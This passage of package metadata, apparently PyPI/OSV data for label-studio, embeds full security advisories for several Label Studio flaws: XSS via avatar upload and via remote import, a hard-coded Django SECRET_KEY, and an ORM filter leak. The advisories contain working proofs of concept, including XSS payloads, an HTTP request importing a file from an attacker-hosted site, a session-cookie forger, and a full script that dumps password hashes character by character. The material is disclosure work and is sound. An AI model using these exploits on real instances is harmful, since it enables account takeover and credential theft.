re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.8.2":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.8.2/","requires_dist":["pip (>=20.2.3)","appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (>=1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (==2.22.0)","six (>=1.13.0)","srsly (>=0.2.0)","tqdm (>=4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","ordered-set (==4.0.2)","orjson (>=2.0.11)","rarfile (==3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","rq (>=1.0)","boto3 (>=1.12.32)","google-cloud-storage (==1.28.1)","flask-wtf (==0.14.3)","label-studio-converter (>=0.0.22)","htmlmin (==0.1.12)","gevent (>=20.6.2)","ujson (==3.0.0)","Colorama (==0.4.4)","boxing (==0.1.4)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.8.2","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"ff76142dafa13ead0ca04fcefbe336b23ddf2ae0dc1cb953a38273162dbfce0b","md5":"917addb7e66e0022220cf618e5657483","sha256":"7f941eda408f91186dc0461967c2be0f6c4bf8c7b190281d83008dabb39f0cee"},"downloads":-1,"filename":"label_studio-0.8.2-py3-none-any.whl","has_sig":false,"md5_digest":"917addb7e66e0022220cf618e5657483","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":12467830,"upload_time":"2020-12-01T21:01:12","upload_time_iso_8601":"2020-12-01T21:01:12.912192Z","url":"https://files.pythonhosted.org/packages/ff/76/142dafa13ead0ca04fcefbe336b23ddf2ae0dc1cb953a38273162dbfce0b/label_studio-0.8.2-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"f82072d9df389aedd44c0e66230d88558fe2cc32bb7acb5eb3d24ea9382c9045","md5":"d1ee274107e308a5ee5ba91589c5fb03","sha256":"08b36bc0b8f60536a704438a21efc814ac2d23e3c83e6d89de25cd3c43ae2b13"},"downloads":-1,"filename":"label-studio-0.8.2.tar.gz","has_sig":false,"md5_digest":"d1ee274107e308a5ee5ba91589c5fb03","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":12363256,"upload_time":"2020-12-01T21:01:18","upload_time_iso_8601":"2020-12-01T21:01:18.776991Z","url":"https://files.pythonhosted.org/packages/f8/20/72d9df389aedd44c0e66230d88558fe2cc32bb7acb5eb3d24ea9382c9045/label-studio-0.8.2.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["